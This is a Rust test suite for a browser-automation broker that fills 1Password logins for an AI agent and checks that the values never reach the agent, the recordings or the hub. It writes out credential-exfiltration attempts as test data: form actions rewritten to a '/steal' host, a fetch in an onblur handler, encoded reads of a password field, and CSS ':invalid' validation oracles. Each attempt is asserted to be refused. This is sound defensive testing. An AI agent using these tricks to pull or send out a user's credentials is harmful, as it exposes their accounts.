//! Logins from 1Password, end to end with a fake 1Password: the node fills them on the item's own site, and the
//! values never reach the agent (its tool results, its raw CDP reads, agent-browser's output), the recording, the hub
//! or what the node reports, in any form a page or an encoding shows them. The site checks it got them.
use std::collections::HashMap;
use std::sync::Mutex;

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use zeroize::Zeroizing;

use super::super::onepassword::{CredError, CredFuture, Credential, TOKEN_ENV, Vault, VaultFor};
use super::*;

const TOKEN: &str = "ops_fake-service-account-token-0123456789";
const USER: &str = "ada@shop.example.test";
/// With the characters a form body, HTML and JSON each encode their own way.
const PASSWORD: &str = "Pw-Sekr3t+/ &x<9\"";
const OTP: &str = "492817";
const USER_REF: &str = "op://Team/Shop/username";
const PASSWORD_REF: &str = "op://Team/Shop/password";
const OTP_REF: &str = "op://Team/Shop/one-time password?attribute=otp";

/// A fake 1Password: each reference's value and the item's websites, for the token the session's secrets hold.
struct FakeOnePassword {
    items: HashMap<&'static str, &'static str>,
    urls: Vec<String>,
    asked: Mutex<Vec<String>>,
}

impl Vault for Arc<FakeOnePassword> {
    fn resolve(&self, reference: &str) -> CredFuture {
        let (this, reference) = (self.clone(), reference.to_owned());
        Box::pin(async move {
            this.asked.lock().unwrap().push(reference.clone());
            match this.items.get(reference.as_str()) {
                Some(value) => Ok(Credential {
                    value: Zeroizing::new((*value).to_owned()),
                    urls: this.urls.clone(),
                }),
                None => Err(CredError {
                    message: format!("no item for {reference}"),
                    rate_limited: false,
                }),
            }
        })
    }
}

fn fake(urls: Vec<String>) -> (Arc<FakeOnePassword>, VaultFor) {
    let vault = Arc::new(FakeOnePassword {
        items: HashMap::from([(USER_REF, USER), (PASSWORD_REF, PASSWORD), (OTP_REF, OTP)]),
        urls,
        asked: Mutex::default(),
    });
    let given = vault.clone();
    let vault_for: VaultFor = Arc::new(move |token| {
        assert_eq!(token.as_str(), TOKEN, "the session's token");
        Arc::new(given.clone()) as Arc<dyn Vault>
    });
    (vault, vault_for)
}

/// Every form a value could leak in: as typed, encoded, escaped, or reversed by a read that reshapes it.
fn forms(value: &str) -> Vec<String> {
    let percent: String = value
        .bytes()
        .map(|b| match b {
            b if b.is_ascii_alphanumeric() || b"-_.~".contains(&b) => (b as char).to_string(),
            b' ' => "+".to_owned(),
            b => format!("%{b:02X}"),
        })
        .collect();
    vec![
        value.to_owned(),
        B64.encode(value),
        URL_SAFE_NO_PAD.encode(value),
        percent,
        serde_json::to_string(value)
            .unwrap()
            .trim_matches('"')
            .to_owned(),
        value
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('"', "&quot;"),
        value.chars().rev().collect(),
    ]
}

/// Fails, naming where, if any value is in `text` in any form.
fn assert_clean(what: &str, text: &str) {
    for value in [USER, PASSWORD, OTP] {
        for form in forms(value) {
            assert!(!text.contains(&form), "{what} holds {form:?}: {text}");
        }
    }
}

fn form_value(body: &str, key: &str) -> Option<String> {
    let raw = body
        .split('&')
        .find_map(|kv| kv.strip_prefix(&format!("{key}=")))?;
    let bytes = raw.replace('+', " ").into_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).unwrap();
            out.push(u8::from_str_radix(hex, 16).unwrap());
            i += 3;
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    Some(String::from_utf8(out).unwrap())
}

/// The shop: a sign-in form at /, one at /elsewhere that sends to another host, one at /two beside a newsletter form
/// that sends to another host's /steal, /login (which greets the user and, carelessly, echoes the password into the
/// page) with a one-time code form, and /otp. Each POST body is kept, /steal's marked so.
async fn shop() -> (String, Arc<Mutex<Vec<String>>>, AbortOnDrop) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let base = format!("http://127.0.0.1:{port}");
    let bodies: Arc<Mutex<Vec<String>>> = Arc::default();
    let kept = bodies.clone();
    let serving = tokio::spawn(async move {
        while let Ok((mut tcp, _)) = listener.accept().await {
            let kept = kept.clone();
            tokio::spawn(async move {
                let mut request = Vec::new();
                let mut chunk = [0u8; 4096];
                let (head, body) = loop {
                    let Ok(n) = tcp.read(&mut chunk).await else {
                        return;
                    };
                    if n == 0 {
                        return;
                    }
                    request.extend_from_slice(&chunk[..n]);
                    let text = String::from_utf8_lossy(&request).into_owned();
                    let Some(end) = text.find("\r\n\r\n") else {
                        continue;
                    };
                    let length: usize = text[..end]
                        .lines()
                        .find_map(|l| {
                            l.to_ascii_lowercase()
                                .strip_prefix("content-length:")
                                .map(|v| v.trim().parse().unwrap_or(0))
                        })
                        .unwrap_or(0);
                    if request.len() >= end + 4 + length {
                        let body = String::from_utf8_lossy(&request[end + 4..end + 4 + length]);
                        break (text[..end].to_owned(), body.into_owned());
                    }
                };
                let sign_in = |action: &str| {
                    format!(
                        "<html><head><title>Sign in</title></head><body><form method=post action={action}>\
                         <input id=user name=user><input id=pw name=pw type=password>\
                         <button id=go>Sign in</button></form></body></html>"
                    )
                };
                let page = if head.starts_with("POST /login") {
                    kept.lock().unwrap().push(body.clone());
                    let user = form_value(&body, "user").unwrap_or_default();
                    let pw = form_value(&body, "pw").unwrap_or_default();
                    let pw = pw
                        .replace('&', "&amp;")
                        .replace('<', "&lt;")
                        .replace('"', "&quot;");
                    format!(
                        "<html><head><title>Welcome</title></head><body><h1>Welcome {user}</h1>\
                         <input id=echo value=\"{pw}\"><form method=post action=/otp><input id=otp name=otp>\
                         <button id=verify>Verify</button></form></body></html>"
                    )
                } else if head.starts_with("POST /otp") {
                    kept.lock().unwrap().push(body.clone());
                    "<html><head><title>Verified</title></head><body><h1>Verified</h1></body></html>".to_owned()
                } else if head.starts_with("POST /steal") {
                    kept.lock().unwrap().push(format!("steal:{body}"));
                    "<html><head><title>Stolen</title></head><body></body></html>".to_owned()
                } else if head.starts_with("GET /two") {
                    sign_in("/login").replace(
                        "</body>",
                        &format!(
                            "<form id=away method=post action=http://localhost:{port}/steal>\
                             <input id=email name=email><button id=send>Subscribe</button></form></body>"
                        ),
                    )
                } else if head.starts_with("GET /elsewhere") {
                    sign_in(&format!("http://localhost:{port}/login"))
                } else {
                    sign_in("/login")
                };
                let response = format!(
                    "HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{page}",
                    page.len()
                );
                let _ = tcp.write_all(response.as_bytes()).await;
            });
        }
    });
    (base, bodies, AbortOnDrop(serving))
}

async fn open(driver: &mut Driver, page: &str, url: &str) {
    driver
        .ok(Some(page), "Page.navigate", json!({ "url": url }))
        .await;
    driver
        .wait_for(
            page,
            "document.readyState === 'complete' && !!document.querySelector('#user')",
        )
        .await;
}

/// Waits for the page's title through `document.title`, agent-browser's own `get title`, which a sealed session runs.
async fn wait_title(driver: &mut Driver, page: &str, title: &str) {
    let deadline = Instant::now() + Duration::from_secs(15);
    while driver.eval(page, "document.title").await != title {
        assert!(Instant::now() < deadline, "never titled {title}");
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

async fn fill(rig: &Rig, reference: &str, target: &str, submit: Option<bool>) -> Value {
    let mut call_args = json!({ "op": "fill_credential", "ref": reference, "target": target });
    if let Some(submit) = submit {
        call_args["submit"] = submit.into();
    }
    call(&rig.broker, call_args).await
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_login_filled_from_1password_never_reaches_the_agent_the_recording_or_the_hub() {
    let Some(rig) = rig_with(vec![(TOKEN_ENV.into(), TOKEN.into())]).await else {
        return;
    };
    let (site, bodies, _site) = shop().await;
    let (vault, vault_for) = fake(vec![format!("{site}/")]);
    rig.broker.set_vaults(vault_for);
    // Everything the agent hears: tool results and raw CDP answers and events.
    let mut heard = String::new();

    let started = call(
        &rig.broker,
        json!({ "op": "session_start", "purpose": "Sign in to the shop" }),
    )
    .await;
    let mut driver = Driver::connect(started["result"]["cdp"].as_str().unwrap())
        .await
        .unwrap();
    let page = driver.page().await;
    driver.ok(Some(&page), "Network.enable", json!({})).await;
    open(&mut driver, &page, &site).await;

    let user = fill(&rig, USER_REF, "#user", Some(false)).await;
    assert!(
        user["result"]["message"]
            .as_str()
            .unwrap()
            .starts_with("Filled #user from op://Team/Shop/username."),
        "{user}"
    );
    let password = fill(&rig, PASSWORD_REF, "#pw", None).await;
    assert!(
        password["result"]["message"]
            .as_str()
            .unwrap()
            .contains("and submitted its form"),
        "{password}"
    );
    heard.push_str(&format!("{user}{password}"));
    wait_title(&mut driver, &page, "Welcome").await;
    rig.broker
        .item(THREAD, &command_item("agent-browser get title", "Welcome"));

    // Raw CDP, as an agent's own script would read. Only agent-browser's own script shapes run, with literals of the
    // agent's: their plain reads come back scrubbed. Any other script is refused, however it reads or reshapes.
    let mut read = |answer: Value| {
        heard.push_str(&answer.to_string());
        answer
    };
    let refused = |answer: &Value| {
        answer["error"]["message"].as_str().is_some_and(|m| {
            m.contains("filled a login from 1Password")
                && m.contains("not one of agent-browser 0.39.4's own scripts")
        })
    };
    let echo = "document.querySelector('#echo')";
    for expression in [
        format!("{echo}.value"),
        format!("btoa({echo}.value)"),
        format!("encodeURIComponent({echo}.value)"),
        format!("{echo}.value.split('').reverse().join('')"),
        format!("[...{echo}.value].map(c => c.charCodeAt(0))"),
        format!("({echo}.value || '').slice(1)"),
        format!("{echo}.type = 'text'"),
        "document.body.innerHTML".to_owned(),
        "navigator.clipboard.readText()".to_owned(),
        "document.forms[0].action = 'http://127.0.0.1:9/steal'".to_owned(),
    ] {
        let answer = driver
            .send(
                Some(&page),
                "Runtime.evaluate",
                json!({ "expression": expression, "returnByValue": true, "awaitPromise": true }),
            )
            .await;
        let answer = read(answer);
        assert!(refused(&answer), "{expression}: {answer}");
    }
    // agent-browser's `get title` and its element lookup are its own shapes.
    assert_eq!(driver.eval(&page, "document.title").await, "Welcome");
    let object = driver
        .ok(
            Some(&page),
            "Runtime.evaluate",
            json!({ "expression": echo }),
        )
        .await["result"]["objectId"]
        .clone();
    let on = |function: &str| json!({ "objectId": object, "functionDeclaration": function, "returnByValue": true });
    // agent-browser's `get attr`, on the field the page echoed the password into: scrubbed.
    let attr = driver
        .ok(
            Some(&page),
            "Runtime.callFunctionOn",
            on("function() { return this.getAttribute('value'); }"),
        )
        .await;
    assert_eq!(
        attr["result"]["value"], "***op://Team/Shop/password***",
        "scrubbed, not refused"
    );
    read(attr);
    // The same read reshaped, or the field's own value: not agent-browser's.
    for function in [
        "function() { return this.value; }",
        "function() { return btoa(this.getAttribute('value')); }",
        "function() { return [...this.getAttribute('value')].reverse().join(''); }",
        "function() { return this.getAttribute('value') || ''; }",
    ] {
        let answer = driver
            .send(Some(&page), "Runtime.callFunctionOn", on(function))
            .await;
        let answer = read(answer);
        assert!(refused(&answer), "{function}: {answer}");
    }
    // A form's action rewritten through one of agent-browser's own shapes, with literals of the agent's: refused.
    let rewrite = "(() => { const el = document.querySelector('form'); \
                   if (el) { el.setAttribute('action', 'http://127.0.0.1:9/steal'); return true; } return false; })()";
    let answer = driver
        .send(
            Some(&page),
            "Runtime.evaluate",
            json!({ "expression": rewrite, "returnByValue": true }),
        )
        .await;
    let answer = read(answer);
    assert!(
        answer["error"]["message"]
            .as_str()
            .is_some_and(|m| m.contains("it changes the action attribute")),
        "{answer}"
    );
    let doc = driver
        .ok(Some(&page), "DOM.getDocument", json!({ "depth": -1 }))
        .await;
    let root = doc["root"]["nodeId"].clone();
    read(doc);
    let node = driver
        .ok(
            Some(&page),
            "DOM.querySelector",
            json!({ "nodeId": root, "selector": "#echo" }),
        )
        .await["nodeId"]
        .clone();
    let form = driver
        .ok(
            Some(&page),
            "DOM.querySelector",
            json!({ "nodeId": root, "selector": "form" }),
        )
        .await["nodeId"]
        .clone();
    for (method, params) in [
        ("DOM.getOuterHTML", json!({ "nodeId": root })),
        ("DOM.getAttributes", json!({ "nodeId": node })),
        ("Accessibility.getFullAXTree", json!({})),
    ] {
        let answer = driver.send(Some(&page), method, params).await;
        assert!(answer.get("error").is_none(), "{method}: {answer}");
        read(answer);
    }
    let login = driver
        .events
        .iter()
        .find(|e| {
            e["method"] == "Network.requestWillBeSent" && e["params"]["request"]["method"] == "POST"
        })
        .expect("the login's request")
        .clone();
    assert!(
        login["params"]["request"]["postData"]
            .as_str()
            .unwrap()
            .contains("***op://Team/Shop/password***"),
        "{login}"
    );
    for (method, params) in [
        (
            "DOMSnapshot.captureSnapshot",
            json!({ "computedStyles": [] }),
        ),
        (
            "Network.getRequestPostData",
            json!({ "requestId": login["params"]["requestId"] }),
        ),
        (
            "DOM.setAttributeValue",
            json!({ "nodeId": node, "name": "type", "value": "text" }),
        ),
        (
            "DOM.setAttributeValue",
            json!({ "nodeId": form, "name": "action", "value": "http://127.0.0.1:9/steal" }),
        ),
        (
            "DOM.setAttributeValue",
            json!({ "nodeId": node, "name": "onblur", "value": "fetch('//x')" }),
        ),
        (
            "DOM.setOuterHTML",
            json!({ "nodeId": form, "outerHTML": "<form action=http://127.0.0.1:9/steal></form>" }),
        ),
        (
            "DOM.moveTo",
            json!({ "nodeId": node, "targetNodeId": root }),
        ),
        ("Page.captureSnapshot", json!({})),
    ] {
        let answer = driver.send(Some(&page), method, params).await;
        assert!(answer["error"].is_object(), "{method}: {answer}");
        read(answer);
    }
    let action = driver
        .ok(Some(&page), "DOM.getAttributes", json!({ "nodeId": form }))
        .await;
    assert!(
        action.to_string().contains("\"/otp\""),
        "the form still sends to its site: {action}"
    );

    // The one-time code: kept from the video and the live view (dots, blurred), then sent with the agent's Enter.
    let otp = fill(&rig, OTP_REF, "#otp", Some(false)).await;
    heard.push_str(&otp.to_string());
    let session = rig.broker.live(THREAD).unwrap();
    let (_, own) = session.page().unwrap();
    let style = session
        .cdp
        .call(
            Some(&own),
            "Runtime.evaluate",
            json!({ "expression": "(s => s.webkitTextSecurity + ' ' + s.filter)(getComputedStyle(document.querySelector('#otp')))",
                    "returnByValue": true }),
        )
        .await
        .unwrap();
    assert_eq!(style["result"]["value"], "disc blur(6px)");
    for kind in ["keyDown", "keyUp"] {
        let mut key =
            json!({ "type": kind, "key": "Enter", "code": "Enter", "windowsVirtualKeyCode": 13 });
        if kind == "keyDown" {
            key["text"] = "\r".into();
        }
        driver.ok(Some(&page), "Input.dispatchKeyEvent", key).await;
    }
    wait_title(&mut driver, &page, "Verified").await;
    heard.push_str(&serde_json::to_string(&driver.events).unwrap());
    // An agent-browser command whose output held a value anyway: logged scrubbed.
    rig.broker.item(
        THREAD,
        &command_item(
            "agent-browser get value #echo",
            &format!("{PASSWORD}\n{USER}"),
        ),
    );
    // What the node reports for the agent's session is masked too, from the fill on.
    let filled = SessionHooks::filled_since(rig.broker.as_ref(), THREAD, 0).unwrap();
    assert_eq!(filled.0.len(), 3);
    assert!(SessionHooks::filled_since(rig.broker.as_ref(), THREAD, 3).is_none());
    let masker = Masker::thorough(&filled.0);
    assert_clean(
        "a report",
        &masker.text(&format!(
            "printed {PASSWORD} and {} and {OTP}",
            B64.encode(USER)
        )),
    );
    tokio::time::sleep(Duration::from_millis(600)).await;

    assert_clean("what the agent heard", &heard);
    // The site did get them.
    let bodies = bodies.lock().unwrap().clone();
    assert_eq!(form_value(&bodies[0], "user").as_deref(), Some(USER));
    assert_eq!(form_value(&bodies[0], "pw").as_deref(), Some(PASSWORD));
    assert_eq!(form_value(&bodies[1], "otp").as_deref(), Some(OTP));
    assert_eq!(
        vault.asked.lock().unwrap().len(),
        3,
        "each read once (none twice)"
    );

    let ended = call(&rig.broker, json!({ "op": "session_end" })).await;
    assert_clean("session_end's answer", &ended.to_string());
    let id = recorded(&rig.hub).await;
    let listed = sessions(&rig.hub).await;
    assert_eq!(listed["sessions"][0]["credentialsFilled"], 3, "{listed}");
    assert_clean("the hub's session", &listed.to_string());
    let actions = String::from_utf8(read_file(&rig.hub, &id, "actions").await).unwrap();
    let dom = String::from_utf8(read_file(&rig.hub, &id, "dom").await).unwrap();
    assert_clean("the action log", &actions);
    assert_clean("the DOM trace", &dom);
    let fills: Vec<Value> = actions
        .lines()
        .map(|l| serde_json::from_str::<Value>(l).unwrap())
        .filter(|l| l["tool"] == "fill_credential")
        .collect();
    assert_eq!(fills.len(), 3, "{actions}");
    assert_eq!(fills[1]["args"]["ref"], PASSWORD_REF);
    assert!(
        dom.contains("Welcome ***op://Team/Shop/username***"),
        "{dom}"
    );
    assert!(
        actions.contains("***op://Team/Shop/password***"),
        "{actions}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_login_fills_only_on_its_items_site_and_only_with_the_projects_token() {
    let Some(rig) = rig_with(vec![(TOKEN_ENV.into(), TOKEN.into())]).await else {
        return;
    };
    let (site, bodies, _site) = shop().await;
    let (vault, vault_for) = fake(vec!["https://shop.example.test/login".into()]);
    rig.broker.set_vaults(vault_for);

    let none = fill(&rig, PASSWORD_REF, "#pw", None).await;
    assert_eq!(none["error"]["code"], "not_found", "{none}");
    let started = call(
        &rig.broker,
        json!({ "op": "session_start", "purpose": "Sign in" }),
    )
    .await;
    let mut driver = Driver::connect(started["result"]["cdp"].as_str().unwrap())
        .await
        .unwrap();
    let page = driver.page().await;
    open(&mut driver, &page, &site).await;

    // The item is for shop.example.test; the page is on 127.0.0.1.
    let elsewhere = fill(&rig, PASSWORD_REF, "#pw", None).await;
    assert_eq!(elsewhere["error"]["code"], "forbidden", "{elsewhere}");
    assert!(
        elsewhere["error"]["message"]
            .as_str()
            .unwrap()
            .contains("is for shop.example.test; this page is on 127.0.0.1"),
        "{elsewhere}"
    );
    assert_clean("a refusal", &elsewhere.to_string());
    let session = rig.broker.live(THREAD).unwrap();
    assert_eq!(
        session
            .credentials_filled
            .load(std::sync::atomic::Ordering::Relaxed),
        0,
        "nothing filled, so not sealed"
    );
    assert_eq!(
        driver
            .eval(&page, "document.querySelector('#pw').value")
            .await,
        ""
    );

    // On its site, but its form sends the login to another host.
    let (_, vault_for) = fake(vec![format!("{site}/")]);
    rig.broker.set_vaults(vault_for);
    call(&rig.broker, json!({ "op": "session_end" })).await;
    let started = call(
        &rig.broker,
        json!({ "op": "session_start", "purpose": "Sign in again" }),
    )
    .await;
    let mut driver = Driver::connect(started["result"]["cdp"].as_str().unwrap())
        .await
        .unwrap();
    let page = driver.page().await;
    open(&mut driver, &page, &format!("{site}/elsewhere")).await;
    let away = fill(&rig, PASSWORD_REF, "#pw", None).await;
    assert!(
        away["error"]["message"]
            .as_str()
            .unwrap()
            .contains("its form sends to localhost"),
        "{away}"
    );
    assert_eq!(
        driver
            .eval(&page, "document.querySelector('#pw').value")
            .await,
        "",
        "nothing typed"
    );
    let missing = fill(&rig, "op://Team/Shop/nothing", "#pw", None).await;
    assert!(
        missing["error"]["message"]
            .as_str()
            .unwrap()
            .contains("op://Team/Shop/nothing was not read: no item"),
        "{missing}"
    );
    let not_a_field = fill(&rig, USER_REF, "#go", Some(false)).await;
    assert!(
        not_a_field["error"]["message"]
            .as_str()
            .unwrap()
            .contains("not a text or password field"),
        "{not_a_field}"
    );
    assert!(bodies.lock().unwrap().is_empty(), "nothing was sent");
    assert!(vault.asked.lock().unwrap().len() == 1);
    call(&rig.broker, json!({ "op": "session_end" })).await;
}

/// A filled field can't be tested against guesses: setting its validation (a `pattern`, lengths) and then asking
/// whether it is `:invalid` would tell its value bit by bit. Shown working on a field before any fill, then refused at
/// each step once a password is filled, by DOM command, by agent-browser's own script shapes and by selector.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_filled_field_cant_be_tested_against_guesses_with_validation_and_invalid() {
    let Some(rig) = rig_with(vec![(TOKEN_ENV.into(), TOKEN.into())]).await else {
        return;
    };
    let (site, bodies, _site) = shop().await;
    let (_, vault_for) = fake(vec![format!("{site}/")]);
    rig.broker.set_vaults(vault_for);
    let started = call(
        &rig.broker,
        json!({ "op": "session_start", "purpose": "Sign in" }),
    )
    .await;
    let mut driver = Driver::connect(started["result"]["cdp"].as_str().unwrap())
        .await
        .unwrap();
    let page = driver.page().await;
    open(&mut driver, &page, &site).await;
    let root = driver
        .ok(Some(&page), "DOM.getDocument", json!({ "depth": -1 }))
        .await["root"]["nodeId"]
        .clone();
    let node = async |driver: &mut Driver, selector: &str| {
        driver
            .ok(
                Some(&page),
                "DOM.querySelector",
                json!({ "nodeId": root, "selector": selector }),
            )
            .await["nodeId"]
            .clone()
    };
    let user = node(&mut driver, "#user").await;
    let pw = node(&mut driver, "#pw").await;
    let count_invalid = "document.querySelectorAll('input:invalid').length";
    let pattern =
        |node: &Value, guess: &str| json!({ "nodeId": node, "name": "pattern", "value": guess });

    // Before a fill, the oracle works: a typed "abc" is valid against "a.*", invalid against "z.*".
    driver
        .ok(Some(&page), "DOM.focus", json!({ "nodeId": user }))
        .await;
    driver
        .ok(Some(&page), "Input.insertText", json!({ "text": "abc" }))
        .await;
    driver
        .ok(Some(&page), "DOM.setAttributeValue", pattern(&user, "a.*"))
        .await;
    assert_eq!(driver.eval(&page, count_invalid).await, 0);
    driver
        .ok(Some(&page), "DOM.setAttributeValue", pattern(&user, "z.*"))
        .await;
    assert_eq!(driver.eval(&page, count_invalid).await, 1);
    driver
        .ok(
            Some(&page),
            "DOM.removeAttribute",
            json!({ "nodeId": user, "name": "pattern" }),
        )
        .await;

    let filled = fill(&rig, PASSWORD_REF, "#pw", Some(false)).await;
    assert!(filled["result"].is_object(), "{filled}");
    let mut heard = filled.to_string();
    let refused = |answer: &Value, says: &str| {
        answer["error"]["message"]
            .as_str()
            .is_some_and(|m| m.contains("1Password") && m.contains(says))
    };
    // Its validation can't be set: by DOM command, on it (which takes no write at all) or any field, nor through
    // agent-browser's own shape.
    for (node, name, value, says) in [
        (&pw, "pattern", "P.*", "is off on this field"),
        (&pw, "maxlength", "3", "is off on this field"),
        (&user, "minlength", "40", "how it validates"),
        (&user, "required", "", "how it validates"),
    ] {
        let answer = driver
            .send(
                Some(&page),
                "DOM.setAttributeValue",
                json!({ "nodeId": node, "name": name, "value": value }),
            )
            .await;
        assert!(refused(&answer, says), "{name}: {answer}");
        heard.push_str(&answer.to_string());
    }
    let located = "(() => { const el = document.querySelector('#pw'); \
                   if (el) { el.setAttribute('pattern', 'P.*'); return false; } return false; })()";
    let answer = driver
        .send(
            Some(&page),
            "Runtime.evaluate",
            json!({ "expression": located, "returnByValue": true }),
        )
        .await;
    assert!(
        refused(&answer, "it changes the pattern attribute"),
        "{answer}"
    );
    heard.push_str(&answer.to_string());
    // Whatever the attribute; another field still takes one.
    let answer = driver
        .send(
            Some(&page),
            "DOM.setAttributeValue",
            json!({ "nodeId": pw, "name": "class", "value": "x" }),
        )
        .await;
    assert!(refused(&answer, "is off on this field"), "{answer}");
    driver
        .ok(
            Some(&page),
            "DOM.setAttributeValue",
            json!({ "nodeId": user, "name": "class", "value": "x" }),
        )
        .await;
    // Nor is its state asked: through agent-browser's `get count` shape, by DOM query, or by search and style rules.
    for selector in [
        "input:invalid",
        "#pw:valid",
        "input:\\69nvalid",
        "#pw:user-invalid",
        "#pw:placeholder-shown",
        "input[value^=\"P\"]",
    ] {
        let expression = format!("document.querySelectorAll({}).length", json!(selector));
        let answer = driver
            .send(
                Some(&page),
                "Runtime.evaluate",
                json!({ "expression": expression, "returnByValue": true }),
            )
            .await;
        assert!(
            refused(&answer, "it queries a field's state"),
            "{selector}: {answer}"
        );
        let answer = driver
            .send(
                Some(&page),
                "DOM.querySelectorAll",
                json!({ "nodeId": root, "selector": selector }),
            )
            .await;
        assert!(
            refused(&answer, "could tell that value"),
            "{selector}: {answer}"
        );
        heard.push_str(&answer.to_string());
    }
    // In a template string, its escapes decoded as the page decodes them (`\x3a` is `:`).
    for expression in [
        "document.querySelectorAll(`input\\x3ainvalid`).length",
        "document.querySelectorAll(`#pw\\u003avalid`).length",
        "document.querySelectorAll(`input\\x5bvalue^=P]`).length",
    ] {
        let answer = driver
            .send(
                Some(&page),
                "Runtime.evaluate",
                json!({ "expression": expression, "returnByValue": true }),
            )
            .await;
        assert!(
            refused(&answer, "it queries a field's state"),
            "{expression}: {answer}"
        );
        heard.push_str(&answer.to_string());
    }
    for (method, params) in [
        ("DOM.performSearch", json!({ "query": "input:invalid" })),
        (
            "CSS.addRule",
            json!({ "styleSheetId": "1", "ruleText": "input:invalid { background: url(//x) }",
                    "location": { "startLine": 0, "startColumn": 0, "endLine": 0, "endColumn": 0 } }),
        ),
        (
            "CSS.setStyleSheetText",
            json!({ "styleSheetId": "1", "text": "input:invalid { color: red }" }),
        ),
        (
            "CSS.forcePseudoState",
            json!({ "nodeId": pw, "forcedPseudoClasses": ["focus"] }),
        ),
    ] {
        let answer = driver.send(Some(&page), method, params).await;
        assert!(
            refused(&answer, "is off in this browser session"),
            "{method}: {answer}"
        );
        heard.push_str(&answer.to_string());
    }
    // agent-browser's own `get count` on a plain selector still runs.
    assert_eq!(
        driver
            .eval(&page, "document.querySelectorAll('input').length")
            .await,
        2
    );
    let attributes = driver
        .ok(Some(&page), "DOM.getAttributes", json!({ "nodeId": pw }))
        .await;
    assert!(
        !attributes.to_string().contains("pattern"),
        "no guess was set: {attributes}"
    );
    heard.push_str(&attributes.to_string());
    assert_clean("what the agent heard", &heard);
    assert!(bodies.lock().unwrap().is_empty(), "nothing was submitted");
    call(&rig.broker, json!({ "op": "session_end" })).await;
}

/// A filled field stays in its own form: it can't be tied to another form by its `form` attribute, nor moved into
/// one, by agent-browser's own script shape, by script or by DOM command; that form would send it to its own address.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_filled_field_cant_be_moved_to_a_form_that_sends_elsewhere() {
    let Some(rig) = rig_with(vec![(TOKEN_ENV.into(), TOKEN.into())]).await else {
        return;
    };
    let (site, bodies, _site) = shop().await;
    let (_, vault_for) = fake(vec![format!("{site}/")]);
    rig.broker.set_vaults(vault_for);
    let started = call(
        &rig.broker,
        json!({ "op": "session_start", "purpose": "Sign in" }),
    )
    .await;
    let mut driver = Driver::connect(started["result"]["cdp"].as_str().unwrap())
        .await
        .unwrap();
    let page = driver.page().await;
    open(&mut driver, &page, &format!("{site}/two")).await;
    let filled = fill(&rig, PASSWORD_REF, "#pw", Some(false)).await;
    assert!(filled["result"].is_object(), "{filled}");
    let mut heard = filled.to_string();
    let root = driver
        .ok(Some(&page), "DOM.getDocument", json!({ "depth": -1 }))
        .await["root"]["nodeId"]
        .clone();
    let mut nodes = Vec::new();
    for selector in ["#pw", "#user", "#away", "form"] {
        nodes.push(
            driver
                .ok(
                    Some(&page),
                    "DOM.querySelector",
                    json!({ "nodeId": root, "selector": selector }),
                )
                .await["nodeId"]
                .clone(),
        );
    }
    let [pw, user, away, login] = <[Value; 4]>::try_from(nodes).unwrap();
    let refused = |answer: &Value| {
        answer["error"]["message"]
            .as_str()
            .is_some_and(|m| m.contains("1Password"))
    };
    // agent-browser's own "located" shape, with the agent's literals, and plain scripts.
    for expression in [
        "(() => { const el = document.querySelector('#pw'); \
         if (el) { el.setAttribute('form', 'away'); return false; } return false; })()",
        "(() => { const el = document.querySelector('#go'); \
         if (el) { el.setAttribute('formaction', 'http://127.0.0.1:9/steal'); return false; } return false; })()",
        "document.querySelector('#away').appendChild(document.querySelector('#pw'))",
        "document.querySelector('#away').append(document.querySelector('form'))",
    ] {
        let answer = driver
            .send(
                Some(&page),
                "Runtime.evaluate",
                json!({ "expression": expression, "returnByValue": true }),
            )
            .await;
        assert!(refused(&answer), "{expression}: {answer}");
        heard.push_str(&answer.to_string());
    }
    // DOM commands: the attribute on the field or the form's other fields, and moves of the field or its form.
    for (method, params) in [
        (
            "DOM.setAttributeValue",
            json!({ "nodeId": user, "name": "form", "value": "away" }),
        ),
        (
            "DOM.setAttributesAsText",
            json!({ "nodeId": user, "text": "form=away" }),
        ),
        ("DOM.moveTo", json!({ "nodeId": pw, "targetNodeId": away })),
        (
            "DOM.moveTo",
            json!({ "nodeId": login, "targetNodeId": away }),
        ),
        ("DOM.copyTo", json!({ "nodeId": pw, "targetNodeId": away })),
    ] {
        let answer = driver.send(Some(&page), method, params).await;
        assert!(refused(&answer), "{method}: {answer}");
        heard.push_str(&answer.to_string());
    }
    // The field is still in its own form, and the other form takes nothing of it.
    let attributes = driver
        .ok(Some(&page), "DOM.getAttributes", json!({ "nodeId": pw }))
        .await;
    assert!(!attributes.to_string().contains("\"form\""), "{attributes}");
    let away_now = driver
        .ok(
            Some(&page),
            "DOM.describeNode",
            json!({ "nodeId": away, "depth": -1 }),
        )
        .await;
    assert!(
        !away_now.to_string().contains("\"pw\""),
        "nothing moved into it: {away_now}"
    );
    heard.push_str(&format!("{attributes}{away_now}"));
    // Sending the other form sends only its own field.
    let button = driver
        .ok(
            Some(&page),
            "DOM.querySelector",
            json!({ "nodeId": root, "selector": "#send" }),
        )
        .await["nodeId"]
        .clone();
    let send = driver
        .ok(Some(&page), "DOM.getBoxModel", json!({ "nodeId": button }))
        .await;
    let quad = &send["model"]["content"];
    let (x, y) = (
        (quad[0].as_f64().unwrap() + quad[4].as_f64().unwrap()) / 2.0,
        (quad[1].as_f64().unwrap() + quad[5].as_f64().unwrap()) / 2.0,
    );
    for kind in ["mousePressed", "mouseReleased"] {
        driver
            .ok(
                Some(&page),
                "Input.dispatchMouseEvent",
                json!({ "type": kind, "x": x, "y": y, "button": "left", "clickCount": 1 }),
            )
            .await;
    }
    wait_title(&mut driver, &page, "Stolen").await;
    let bodies = bodies.lock().unwrap().clone();
    assert_eq!(
        bodies,
        vec!["steal:email=".to_owned()],
        "only its own field"
    );
    heard.push_str(&serde_json::to_string(&driver.events).unwrap());
    assert_clean("what the agent heard", &heard);
    call(&rig.broker, json!({ "op": "session_end" })).await;
}

